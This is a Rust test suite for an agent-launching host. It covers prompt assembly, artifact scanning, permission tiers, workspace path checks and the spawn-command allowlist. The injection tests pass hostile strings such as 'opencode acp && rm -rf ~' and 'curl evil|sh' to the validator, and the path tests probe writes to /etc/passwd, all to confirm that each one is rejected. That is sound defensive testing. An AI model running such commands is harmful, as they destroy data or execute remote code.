use std::path::{Path, PathBuf};
use std::str::FromStr;

use agent_client_protocol::schema::v1::{
    ContentBlock, PermissionOption, PermissionOptionId, PermissionOptionKind,
    RequestPermissionRequest, SessionId, ToolCallLocation, ToolCallUpdate, ToolCallUpdateFields,
    ToolKind,
};
use agent_client_protocol::AcpAgent;
use tokio::sync::oneshot;

use crate::process_guard;

use super::artifacts::{is_turn_artifact_file, now_ms, scan_turn_artifacts};
use super::env::{
    handshake_timeout_secs, sanitize_env, ALLOWED_AGENT_PROGRAMS, MAX_PROVIDER_ENV_VALUE_CHARS,
    MAX_PROVIDER_ENV_VARS,
};
use super::permission::{
    permission_payload, release_pending_permissions, PERMISSION_RAW_INPUT_MAX_BYTES,
};
use super::policy::{
    blocked_paths, comparable_path, decide_permission, is_readonly_kind, is_within, is_write_kind,
    normalize_lexical, validate_cwd, PermissionTier, PermissionVerdict, SessionPolicy,
};
use super::prompt::{
    acp_cancel_session, prompt_blocks, PromptUnit, PROMPT_MAX_BASE64_BYTES, PROMPT_MAX_UNITS,
};
use super::state::{AcpHost, PendingPermission, PermissionDecision};

/// Windows 上 `.cmd` 垫片会被包成 `cmd /C <原命令>`（process_guard::shell_command）。
/// 这条断言把包装串喂给 crate **自己的**拆词器（shell_words），钉死它还原成
/// 「cmd + /C + 原参数」—— 包装若引入了会被拆词吃掉的引号/反斜杠，这里立刻暴露，
/// 不必等到 Windows 上手动试。
#[test]
fn wrapped_windows_command_survives_agent_parsing() {
    let agent = AcpAgent::from_str("cmd /C npx -y @agentclientprotocol/codex-acp")
        .expect("包装串应当能解析");
    let config = serde_json::to_value(agent.into_config()).expect("序列化配置");
    assert_eq!(config["command"], "cmd");
    assert_eq!(
        config["args"],
        serde_json::json!(["/C", "npx", "-y", "@agentclientprotocol/codex-acp"])
    );
}

/// 反面钉死：**不要把解析出的绝对路径写进启动串**。
/// crate 的拆词是 POSIX 规则，`\` 是转义符 —— `C:\nodejs\npx.cmd` 会被吃成
/// `C:nodejsnpx.cmd`，路径直接失效。shell_command 因此只包 `cmd /C` 并保留裸程序名。
#[test]
fn backslash_paths_are_mangled_by_agent_parsing() {
    let agent = AcpAgent::from_str(r"cmd /C C:\nodejs\npx.cmd -y pkg").expect("仍能解析");
    let config = serde_json::to_value(agent.into_config()).expect("序列化配置");
    assert_eq!(
        config["args"],
        serde_json::json!(["/C", "C:nodejsnpx.cmd", "-y", "pkg"]),
        "反斜杠被拆词吃掉：正因如此 shell_command 不把路径写进命令串"
    );
}

#[test]
fn prompt_blocks_puts_text_first_and_maps_units() {
    let blocks = prompt_blocks(
        "看下这张图".to_string(),
        vec![
            PromptUnit::Image {
                data: "AAAA".to_string(),
                mime_type: "image/png".to_string(),
            },
            PromptUnit::Text {
                text: "---\n[附件：notes.md]\n```\nhi\n```\n".to_string(),
            },
        ],
    )
    .expect("组装成功");
    assert_eq!(blocks.len(), 3);
    match &blocks[0] {
        ContentBlock::Text(text) => assert_eq!(text.text, "看下这张图"),
        other => panic!("正文必须在最前，实际 {other:?}"),
    }
    match &blocks[1] {
        ContentBlock::Image(image) => {
            assert_eq!(image.data, "AAAA");
            assert_eq!(image.mime_type, "image/png");
        }
        other => panic!("第二个应为 image 块，实际 {other:?}"),
    }
    match &blocks[2] {
        ContentBlock::Text(text) => assert!(text.text.contains("notes.md")),
        other => panic!("第三个应为 text 块，实际 {other:?}"),
    }
}

/// 渲染端发的是 camelCase JSON（`{type:"image", data, mimeType}`）：字段名对不上会导致
/// 整轮带图 prompt 反序列化失败，且失败点在主机侧、现象是「派发没反应」——必须钉死。
#[test]
fn prompt_unit_deserializes_renderer_payload() {
    let units: Vec<PromptUnit> = serde_json::from_value(serde_json::json!([
        { "type": "image", "data": "QUJD", "mimeType": "image/png" },
        { "type": "text", "text": "---\n[附件：a.md]\n" }
    ]))
    .expect("渲染端载荷应当能反序列化");
    assert_eq!(units.len(), 2);
    match &units[0] {
        PromptUnit::Image { data, mime_type } => {
            assert_eq!(data, "QUJD");
            assert_eq!(mime_type, "image/png");
        }
        other => panic!("第一个应为 image 单元，实际 {other:?}"),
    }
}

/// 只发附件（截图问答）：不补空 text 块；两者都空则直接拒绝，别发一个空 prompt 过去。
#[test]
fn prompt_blocks_allows_attachment_only_prompts() {
    let blocks = prompt_blocks(
        String::new(),
        vec![PromptUnit::Image {
            data: "QUJD".to_string(),
            mime_type: "image/png".to_string(),
        }],
    )
    .expect("只有图片也应当能组装");
    assert_eq!(blocks.len(), 1);
    assert!(matches!(&blocks[0], ContentBlock::Image(_)));

    assert!(prompt_blocks(String::new(), Vec::new()).is_err());
}

#[test]
fn prompt_blocks_rejects_over_limit_payloads() {
    // 单元数超限
    let many: Vec<PromptUnit> = (0..PROMPT_MAX_UNITS + 1)
        .map(|_| PromptUnit::Text {
            text: "x".to_string(),
        })
        .collect();
    assert!(prompt_blocks("t".to_string(), many).is_err());
    // base64 总量超限
    let huge = vec![PromptUnit::Image {
        data: "A".repeat(PROMPT_MAX_BASE64_BYTES + 1),
        mime_type: "image/png".to_string(),
    }];
    assert!(prompt_blocks("t".to_string(), huge).is_err());
}

#[test]
fn handshake_timeout_widens_for_registry_launchers() {
    assert_eq!(handshake_timeout_secs("opencode acp"), 10);
    assert_eq!(handshake_timeout_secs("gemini --acp"), 10);
    // npx 型：适配器冷启动要下载 + 拉起 App Server，窗口放宽
    assert_eq!(
        handshake_timeout_secs("npx -y @agentclientprotocol/codex-acp"),
        120
    );
    assert_eq!(
        handshake_timeout_secs("npx -y @agentclientprotocol/claude-agent-acp"),
        120
    );
    assert_eq!(
        handshake_timeout_secs("bunx @qwen-code/qwen-code --acp"),
        120
    );
    assert_eq!(handshake_timeout_secs("/usr/bin/goose acp"), 10);
}

/// 把文件 mtime 拨到 now-age_secs（std 无 filetime 依赖，用 File::set_modified）。
fn backdate(path: &std::path::Path, age_secs: u64) {
    let file = std::fs::OpenOptions::new()
        .write(true)
        .open(path)
        .expect("open for backdate");
    file.set_modified(std::time::SystemTime::now() - std::time::Duration::from_secs(age_secs))
        .expect("set mtime");
}

#[test]
fn scan_turn_artifacts_picks_only_fresh_document_files() {
    let root = std::env::temp_dir().join(format!("gw-scan-fresh-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(root.join("reports")).unwrap();
    std::fs::create_dir_all(root.join("node_modules/pkg")).unwrap();
    std::fs::create_dir_all(root.join(".hidden")).unwrap();
    // 命中：新写的白名单文档
    std::fs::write(root.join("data.csv"), b"a,b\n").unwrap();
    std::fs::write(root.join("reports/brief.md"), b"# brief").unwrap();
    // 未命中：白名单但 mtime 早于窗口
    std::fs::write(root.join("reports/old.md"), b"old").unwrap();
    backdate(&root.join("reports/old.md"), 3600);
    // 未命中：非白名单扩展名（新写）
    std::fs::write(root.join("notes.txt"), b"hi").unwrap();
    std::fs::write(root.join("package.json"), r#"{"x":1}"#).unwrap();
    // 未命中：Office 锁文件与隐藏文件
    std::fs::write(root.join("~$lock.xlsx"), b"lock").unwrap();
    std::fs::write(root.join(".dot.md"), b"hidden").unwrap();
    // 未命中：噪音目录与隐藏目录里的新文档
    std::fs::write(root.join("node_modules/pkg/readme.md"), b"dep").unwrap();
    std::fs::write(root.join(".hidden/secret.md"), b"secret").unwrap();

    let found = scan_turn_artifacts(&root, now_ms() - 10_000);
    let names: Vec<String> = found
        .iter()
        .map(|path| {
            path.strip_prefix(&root)
                .unwrap()
                .to_string_lossy()
                // Windows 的分隔符是 `\`，归一成 `/` 以便跨平台断言。
                .replace('\\', "/")
        })
        .collect();
    assert_eq!(names, vec!["data.csv", "reports/brief.md"]);

    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn scan_turn_artifacts_empty_or_missing_root_yields_nothing() {
    let root = std::env::temp_dir().join(format!("gw-scan-empty-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(&root).unwrap();
    assert!(scan_turn_artifacts(&root, now_ms() - 10_000).is_empty());
    // 目录不存在 / 无权限路径：静默空，不 panic
    assert!(scan_turn_artifacts(&root.join("nope"), 0).is_empty());
    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn is_turn_artifact_file_matches_case_insensitively() {
    assert!(is_turn_artifact_file(std::path::Path::new(
        "a/b/Report.XLSX"
    )));
    assert!(is_turn_artifact_file(std::path::Path::new("简报.PPTX")));
    assert!(!is_turn_artifact_file(std::path::Path::new("a/notes.txt")));
    assert!(!is_turn_artifact_file(std::path::Path::new(
        "a/~$report.xlsx"
    )));
    assert!(!is_turn_artifact_file(std::path::Path::new("a/.report.md")));
    assert!(!is_turn_artifact_file(std::path::Path::new(
        "a/report.docx~"
    )));
}

#[test]
fn path_probe_hits_executable_and_misses_absent() {
    let dir = std::env::temp_dir().join(format!("gw-probe-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    // Windows 的 `probe_program` 按 PATHEXT 展开，只认 `.exe/.cmd/.bat` 之类；
    // 裸名文件探不到，故此处按平台补上可执行扩展名。
    let exe_name = if cfg!(windows) {
        "gw-fake-agent.cmd"
    } else {
        "gw-fake-agent"
    };
    let exe = dir.join(exe_name);
    std::fs::write(&exe, b"#!/bin/sh\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let path_string = dir.to_string_lossy().into_owned();
    let path_value = std::ffi::OsStr::new(&path_string);

    assert!(process_guard::probe_program("gw-fake-agent", Some(path_value)).is_some());
    assert!(process_guard::probe_program("gw-no-such-agent", Some(path_value)).is_none());

    let _ = std::fs::remove_file(&exe);
    let _ = std::fs::remove_dir(&dir);
}

#[test]
fn agent_command_allows_known_programs_and_rejects_injection() {
    assert_eq!(
        process_guard::validate_spawn_command("opencode acp", ALLOWED_AGENT_PROGRAMS).unwrap(),
        "opencode acp"
    );
    assert!(process_guard::validate_spawn_command(
        "npx -y @agentclientprotocol/codex-acp",
        ALLOWED_AGENT_PROGRAMS
    )
    .is_ok());
    // shell 元字符 / 链式命令
    assert!(process_guard::validate_spawn_command(
        "opencode acp && rm -rf ~",
        ALLOWED_AGENT_PROGRAMS
    )
    .is_err());
    assert!(process_guard::validate_spawn_command("curl evil|sh", ALLOWED_AGENT_PROGRAMS).is_err());
    assert!(process_guard::validate_spawn_command(
        "opencode acp; curl evil",
        ALLOWED_AGENT_PROGRAMS
    )
    .is_err());
    // 相对路径与未知程序
    assert!(
        process_guard::validate_spawn_command("./evil --serve", ALLOWED_AGENT_PROGRAMS).is_err()
    );
    assert!(
        process_guard::validate_spawn_command("malicious-agent acp", ALLOWED_AGENT_PROGRAMS)
            .is_err()
    );
    assert!(process_guard::validate_spawn_command("   ", ALLOWED_AGENT_PROGRAMS).is_err());
}

#[test]
fn provider_env_sanitizer_rejects_bad_names_and_oversize_batches() {
    let mut good = std::collections::HashMap::new();
    good.insert("ANTHROPIC_API_KEY".to_string(), "sk-test".to_string());
    good.insert("_DEBUG".to_string(), "1".to_string());
    let vars = sanitize_env(Some(good)).unwrap();
    assert_eq!(vars.len(), 2);
    assert!(sanitize_env(None).unwrap().is_empty());

    for bad in ["1KEY", "KEY-DASH", "KEY DOT", "", "ключ"] {
        let mut map = std::collections::HashMap::new();
        map.insert(bad.to_string(), "v".to_string());
        assert!(sanitize_env(Some(map)).is_err(), "非法名 {bad:?} 应被拒绝");
    }

    let mut nul = std::collections::HashMap::new();
    nul.insert("KEY".to_string(), "a\0b".to_string());
    assert!(sanitize_env(Some(nul)).is_err(), "值含 NUL 应被拒绝");

    let mut oversized = std::collections::HashMap::new();
    oversized.insert(
        "KEY".to_string(),
        "x".repeat(MAX_PROVIDER_ENV_VALUE_CHARS + 1),
    );
    assert!(sanitize_env(Some(oversized)).is_err());

    let too_many: std::collections::HashMap<String, String> = (0..=MAX_PROVIDER_ENV_VARS)
        .map(|index| (format!("KEY_{index}"), "v".to_string()))
        .collect();
    assert!(sanitize_env(Some(too_many)).is_err(), "超量整批拒绝");
}

#[test]
fn cwd_rejects_roots_relative_and_missing() {
    assert!(validate_cwd("/").is_err());
    assert!(validate_cwd("C:/").is_err());
    assert!(validate_cwd("relative/path").is_err());
    assert!(validate_cwd("/nonexistent/greywork-cwd-probe").is_err());
    let tmp = std::env::temp_dir();
    assert_eq!(validate_cwd(&tmp.to_string_lossy()).unwrap(), tmp);
}

#[test]
fn tier_parse_maps_new_and_legacy_values() {
    assert_eq!(
        PermissionTier::parse(Some("read-only")),
        PermissionTier::ReadOnly
    );
    assert_eq!(
        PermissionTier::parse(Some("workspace")),
        PermissionTier::Workspace
    );
    assert_eq!(
        PermissionTier::parse(Some("full-access")),
        PermissionTier::Full
    );
    assert_eq!(PermissionTier::parse(Some("full")), PermissionTier::Full);
    // 旧值兼容：daily→Workspace、auto→Full、cautious→ReadOnly（fail-closed）
    assert_eq!(
        PermissionTier::parse(Some("daily")),
        PermissionTier::Workspace
    );
    assert_eq!(PermissionTier::parse(Some("auto")), PermissionTier::Full);
    assert_eq!(
        PermissionTier::parse(Some("cautious")),
        PermissionTier::ReadOnly
    );
    // 未知 / 缺失 fail-closed
    assert_eq!(
        PermissionTier::parse(Some("yolo")),
        PermissionTier::ReadOnly
    );
    assert_eq!(PermissionTier::parse(None), PermissionTier::ReadOnly);
    assert_eq!(PermissionTier::default(), PermissionTier::ReadOnly);
}

fn permission_request(kind: Option<ToolKind>, allow: bool) -> RequestPermissionRequest {
    permission_request_at(kind, allow, &[])
}

/// 带 locations 的权限请求，用于工作区锚定判定。
fn permission_request_at(
    kind: Option<ToolKind>,
    allow: bool,
    paths: &[&str],
) -> RequestPermissionRequest {
    let option = PermissionOption::new(
        "opt-1",
        if allow { "Allow" } else { "Reject" },
        if allow {
            PermissionOptionKind::AllowOnce
        } else {
            PermissionOptionKind::RejectOnce
        },
    );
    let locations: Vec<ToolCallLocation> = paths
        .iter()
        .map(|path| ToolCallLocation::new(*path))
        .collect();
    let fields = ToolCallUpdateFields::default()
        .kind(kind)
        .locations(Some(locations));
    RequestPermissionRequest::new(
        SessionId::new("sess-1"),
        ToolCallUpdate::new("call-1", fields),
        vec![option],
    )
}

fn policy(tier: PermissionTier, root: Option<&str>) -> SessionPolicy {
    SessionPolicy {
        tier,
        workspace_root: root.map(PathBuf::from),
    }
}

fn allowed(id: &str) -> PermissionVerdict {
    PermissionVerdict::AutoAllow(PermissionOptionId::from(id.to_string()))
}

#[test]
fn read_only_blocks_writes_and_auto_allows_reads() {
    assert!(is_readonly_kind(Some(ToolKind::Read)));
    assert!(!is_readonly_kind(Some(ToolKind::Execute)));
    assert!(!is_readonly_kind(None));

    let readonly = policy(PermissionTier::ReadOnly, None);
    // 写/执行/未知 → 一律拒绝（不依赖 Allow 选项与锚定）
    for kind in [
        Some(ToolKind::Edit),
        Some(ToolKind::Delete),
        Some(ToolKind::Move),
        Some(ToolKind::Execute),
        None,
    ] {
        assert_eq!(
            decide_permission(&readonly, &permission_request(kind, true)),
            PermissionVerdict::BlockedReadOnly,
            "read-only 档不得放行 {kind:?}"
        );
    }
    // 只读类 + 有 Allow 选项 → 直通
    assert_eq!(
        decide_permission(&readonly, &permission_request(Some(ToolKind::Read), true)),
        allowed("opt-1")
    );
    // 只读但没有 Allow 选项 → 转发前端（可拒绝）
    assert_eq!(
        decide_permission(&readonly, &permission_request(Some(ToolKind::Read), false)),
        PermissionVerdict::Ask
    );
}

#[test]
fn workspace_tier_anchors_writes_and_asks_for_execute() {
    let root = "/home/user/proj";
    let workspace = policy(PermissionTier::Workspace, Some(root));

    // 只读 → 直通
    assert_eq!(
        decide_permission(&workspace, &permission_request(Some(ToolKind::Read), true)),
        allowed("opt-1")
    );
    // 界内写 → 直通（工作区语义：区内自由读写）
    assert_eq!(
        decide_permission(
            &workspace,
            &permission_request_at(Some(ToolKind::Edit), true, &["/home/user/proj/a.ts"])
        ),
        allowed("opt-1")
    );
    // 越界写 → 拦截（不可绕过）
    assert_eq!(
        decide_permission(
            &workspace,
            &permission_request_at(Some(ToolKind::Delete), true, &["/home/user/other/x.ts"])
        ),
        PermissionVerdict::BlockedOutsideWorkspace(vec![PathBuf::from("/home/user/other/x.ts")])
    );
    // Execute（无法静态验证命令目标）→ 逐条确认
    assert_eq!(
        decide_permission(
            &workspace,
            &permission_request(Some(ToolKind::Execute), true)
        ),
        PermissionVerdict::Ask
    );
    // 未绑定工作区（无锚定基准）→ 写类逐条确认，不盲放
    let no_root = policy(PermissionTier::Workspace, None);
    assert_eq!(
        decide_permission(
            &no_root,
            &permission_request_at(Some(ToolKind::Edit), true, &["/etc/passwd"])
        ),
        PermissionVerdict::Ask
    );
    // 非写类工具不受锚定约束（读越界按档位直通）
    assert_eq!(
        decide_permission(
            &workspace,
            &permission_request_at(Some(ToolKind::Read), true, &["/etc/passwd"])
        ),
        allowed("opt-1")
    );
}

#[test]
fn full_tier_passes_everything_and_skips_anchor() {
    let root = "/home/user/proj";
    let full = policy(PermissionTier::Full, Some(root));

    // 越界写也不拦——Full 语义即不设工作区边界（前端选择时已警告）
    assert_eq!(
        decide_permission(
            &full,
            &permission_request_at(Some(ToolKind::Edit), true, &["/etc/passwd"])
        ),
        allowed("opt-1")
    );
    // Execute 直通
    assert_eq!(
        decide_permission(&full, &permission_request(Some(ToolKind::Execute), true)),
        allowed("opt-1")
    );
    // 没给 Allow 选项 → 直接取消，不打扰用户
    assert_eq!(
        decide_permission(&full, &permission_request(Some(ToolKind::Execute), false)),
        PermissionVerdict::AutoCancel
    );
}

/// 带 raw_input 的权限请求（execute 类：命令正文）。
fn permission_request_with_raw(raw: serde_json::Value) -> RequestPermissionRequest {
    let fields = ToolCallUpdateFields::default()
        .kind(Some(ToolKind::Execute))
        .raw_input(Some(raw));
    RequestPermissionRequest::new(
        SessionId::new("sess-1"),
        ToolCallUpdate::new("call-raw", fields),
        vec![PermissionOption::new(
            "opt-1",
            "Allow",
            PermissionOptionKind::AllowOnce,
        )],
    )
}

/// 卡片要靠这两个字段说清「动哪些文件、跑什么命令」。丢掉它们，用户就只能
/// 对着一行标题盲批——这正是之前的行为。
#[test]
fn permission_payload_carries_locations_and_raw_input() {
    let request = permission_request_at(
        Some(ToolKind::Edit),
        true,
        &["/home/user/proj/a.ts", "/home/user/proj/b.ts"],
    );

    let payload = permission_payload(7, false, None, &request);
    assert_eq!(payload["requestId"], 7);
    assert_eq!(payload["auto"], false);
    assert_eq!(payload["toolCallId"], "call-1");
    assert_eq!(payload["kind"], "edit");
    assert_eq!(
        payload["locations"],
        serde_json::json!(["/home/user/proj/a.ts", "/home/user/proj/b.ts"])
    );

    // auto 路径与前端确认路径共用本函数：chosen 必须一起透出，否则留痕写不出「批准了什么」。
    let auto = permission_payload(u64::MAX, true, Some("opt-1"), &request);
    assert_eq!(auto["auto"], true);
    assert_eq!(auto["chosen"], "opt-1");

    // 无 locations 的请求（execute / think）→ 空数组，前端不必做 null 兜底。
    let bare = permission_request(Some(ToolKind::Think), true);
    assert_eq!(
        permission_payload(8, false, None, &bare)["locations"],
        serde_json::json!([])
    );
}

/// rawInput 是 agent 自定形状：小载荷原样透传（前端自己找 command），
/// 超限整块丢弃——路径有 locations 兜底，不值得为一行明细撑大 IPC 载荷。
#[test]
fn permission_payload_forwards_small_raw_input_and_drops_oversize() {
    let small = permission_payload(
        1,
        false,
        None,
        &permission_request_with_raw(serde_json::json!({ "command": "echo hi" })),
    );
    assert_eq!(small["rawInput"]["command"], "echo hi");

    let oversize = permission_payload(
        2,
        false,
        None,
        &permission_request_with_raw(serde_json::json!({
            "diff": "x".repeat(PERMISSION_RAW_INPUT_MAX_BYTES + 1)
        })),
    );
    assert!(oversize["rawInput"].is_null(), "超限 rawInput 应被丢弃");
}

#[test]
fn session_policy_default_fails_closed() {
    // 未登记 handle 的兜底：ReadOnly（fail-closed）、无锚定基准
    let fallback = SessionPolicy::default();
    assert_eq!(fallback.tier, PermissionTier::ReadOnly);
    assert!(fallback.workspace_root.is_none());
    // 读请求可自动放行（只读档语义），写请求一律拒绝
    assert_eq!(
        decide_permission(&fallback, &permission_request(Some(ToolKind::Read), true)),
        allowed("opt-1")
    );
    assert_eq!(
        decide_permission(&fallback, &permission_request(Some(ToolKind::Edit), true)),
        PermissionVerdict::BlockedReadOnly
    );
}

#[tokio::test]
async fn release_pending_permissions_cancels_only_target_handle() {
    let host = AcpHost::default();
    let (tx_a, rx_a) = oneshot::channel::<PermissionDecision>();
    let (tx_b, rx_b) = oneshot::channel::<PermissionDecision>();
    {
        let mut pending = host.pending_permissions.lock().await;
        pending.insert(
            1,
            PendingPermission {
                handle: 7,
                responder: tx_a,
            },
        );
        pending.insert(
            2,
            PendingPermission {
                handle: 8,
                responder: tx_b,
            },
        );
    }

    release_pending_permissions(&host, 7).await;

    // handle 7 的待决项被取消并摘除
    assert!(matches!(rx_a.await, Ok(PermissionDecision::Cancel)));
    let pending = host.pending_permissions.lock().await;
    assert!(!pending.contains_key(&1));
    // handle 8 不受影响，仍在等待裁决
    assert!(pending.contains_key(&2));
    drop(rx_b);
}

#[tokio::test]
async fn set_tier_rejects_unknown_handle() {
    // 降级必须能被前端感知失败：未登记 handle 静默成功会让 UI 误报「已降为只读」
    let host = AcpHost::default();
    assert!(host.set_tier(7, PermissionTier::ReadOnly).await.is_err());
}

#[tokio::test]
async fn cancel_session_rejects_unknown_handle() {
    // 子代理取消要打到真实连接上；未登记 handle 必须显式报错，
    // 否则「取消没生效」会被静默吞掉（与 set_tier 同一 fail-loud 语义）。
    let host = std::sync::Arc::new(AcpHost::default());
    assert!(acp_cancel_session(&host, 99, "sess-child".to_string())
        .await
        .is_err());
}

#[test]
fn normalize_lexical_resolves_dot_and_parent() {
    let base = PathBuf::from("/home/user/proj");
    assert_eq!(normalize_lexical(&base), base);
    assert_eq!(
        normalize_lexical(Path::new("/home/user/proj/./a/../b")),
        PathBuf::from("/home/user/proj/b")
    );
    // 相对路径
    assert_eq!(
        normalize_lexical(Path::new("a/./b/../c")),
        PathBuf::from("a/c")
    );
}

#[test]
fn is_within_componentwise_matching() {
    let base = Path::new("/home/user/proj");
    assert!(is_within(base, Path::new("/home/user/proj/file.ts")));
    assert!(is_within(
        base,
        Path::new("/home/user/proj/sub/dir/../file.ts")
    ));
    // 组件级前缀：proj 不是 proj2 / project-evil 的前缀
    assert!(!is_within(base, Path::new("/home/user/proj2/file.ts")));
    assert!(!is_within(
        base,
        Path::new("/home/user/project-evil/file.ts")
    ));
    // 父目录越界
    assert!(!is_within(base, Path::new("/home/user/other/file.ts")));
    assert!(!is_within(base, Path::new("/etc/passwd")));
    assert!(!is_within(base, Path::new("/home/user/proj/../secret.ts")));
}

/// 词法归一化（消掉 `.` / `..`）在所有平台都要做 —— 否则 `/a/../b` 与 `/b`
/// 会被当成两个不同目录。
#[test]
fn comparable_path_normalizes_lexically_on_every_platform() {
    assert_eq!(
        comparable_path(Path::new("/home/user/proj/../file.ts")),
        PathBuf::from("/home/user/file.ts")
    );
}

/// Linux 是真正大小写敏感的 POSIX 语义，不能折。
#[cfg(target_os = "linux")]
#[test]
fn comparable_path_is_case_sensitive_on_linux() {
    assert_ne!(
        comparable_path(Path::new("/Home/User")),
        comparable_path(Path::new("/home/user"))
    );
}

/// macOS 默认文件系统（APFS / HFS+）大小写不敏感，必须折 —— 否则 agent 回一个
/// 大小写不同的路径会被 `is_within` 误拒（工作区档位下写不进自己的文件）。
#[cfg(target_os = "macos")]
#[test]
fn comparable_path_folds_case_on_macos() {
    assert_eq!(
        comparable_path(Path::new("/Home/User")),
        comparable_path(Path::new("/home/user"))
    );
}

#[test]
fn is_write_kind_covers_edit_delete_move_only() {
    assert!(is_write_kind(Some(ToolKind::Edit)));
    assert!(is_write_kind(Some(ToolKind::Delete)));
    assert!(is_write_kind(Some(ToolKind::Move)));
    assert!(!is_write_kind(Some(ToolKind::Read)));
    assert!(!is_write_kind(Some(ToolKind::Execute)));
    assert!(!is_write_kind(None));
}

#[test]
fn blocked_paths_collects_only_outside_locations() {
    let root = Path::new("/home/user/proj");
    let locations = vec![
        ToolCallLocation::new("/home/user/proj/src/main.ts"),
        ToolCallLocation::new("/home/user/proj2/leak.ts"),
        ToolCallLocation::new("/etc/passwd"),
    ];
    let blocked = blocked_paths(root, &locations);
    assert_eq!(blocked.len(), 2);
    assert_eq!(blocked[0], PathBuf::from("/home/user/proj2/leak.ts"));
    assert_eq!(blocked[1], PathBuf::from("/etc/passwd"));

    assert!(blocked_paths(root, &[ToolCallLocation::new("/home/user/proj/a.ts")]).is_empty());
    assert!(blocked_paths(root, &[]).is_empty());
}

/// 复刻 `acp_start` 的放行面组装：内置白名单 ∪ `extra_programs`。
fn allowlist(extra: &[String]) -> Vec<&str> {
    let mut allowed: Vec<&str> = ALLOWED_AGENT_PROGRAMS.to_vec();
    allowed.extend(extra.iter().map(String::as_str));
    allowed
}

/// 桌面语义：`extra_programs` 来自 `db.enabled_agent_programs()`，用户启用的自配程序放行。
#[test]
fn spawn_gate_accepts_user_enabled_custom_programs() {
    let db = crate::db::Db::open_in_memory().expect("open");
    db.sync_agent_providers(&[
        crate::db::AgentProviderDto {
            id: "custom-1".to_string(),
            name: "My Agent".to_string(),
            kind: "acp".to_string(),
            command: "my-agent acp".to_string(),
            enabled: true,
            env: None,
        },
        crate::db::AgentProviderDto {
            id: "custom-off".to_string(),
            name: "Disabled".to_string(),
            kind: "acp".to_string(),
            command: "disabled-agent acp".to_string(),
            enabled: false,
            env: None,
        },
    ])
    .unwrap();
    let programs = db.enabled_agent_programs();
    let allowed = allowlist(&programs);

    // 用户启用的自配程序可 spawn；禁用项不进入放行面
    assert_eq!(
        process_guard::validate_spawn_command("my-agent acp", &allowed).unwrap(),
        "my-agent acp"
    );
    assert!(process_guard::validate_spawn_command("disabled-agent acp", &allowed).is_err());
    // 白名单语义不因扩展而失效：未声明的程序仍被拒，元字符拒绝仍生效
    assert!(process_guard::validate_spawn_command("malicious acp", &allowed).is_err());
    assert!(process_guard::validate_spawn_command("my-agent acp && rm -rf ~", &allowed).is_err());
}

/// 服务端语义：`acp_start` 不再读 DB，`extra_programs` 为空时 DB 里启用的自配程序
/// **不得**放行 —— 这是「服务端冻结白名单」的结构性保证（DB 可被 `db_agents_sync`
/// 改写，若 acp_start 仍读 DB，客户端就能自行扩大 spawn 面）。
#[test]
fn frozen_allowlist_ignores_db_enabled_programs() {
    let db = crate::db::Db::open_in_memory().expect("open");
    db.sync_agent_providers(&[crate::db::AgentProviderDto {
        id: "custom-1".to_string(),
        name: "My Agent".to_string(),
        kind: "acp".to_string(),
        command: "my-agent acp".to_string(),
        enabled: true,
        env: None,
    }])
    .unwrap();
    // DB 里确实有可放行的程序……
    assert_eq!(db.enabled_agent_programs(), vec!["my-agent".to_string()]);
    // ……但只要调用方不给 extra_programs（服务端即如此），它就被拒。
    let frozen = allowlist(&[]);
    assert!(process_guard::validate_spawn_command("my-agent acp", &frozen).is_err());
    // 配置显式放行时才通过。
    let extra = ["my-agent".to_string()];
    let configured = allowlist(&extra);
    assert!(process_guard::validate_spawn_command("my-agent acp", &configured).is_ok());
}
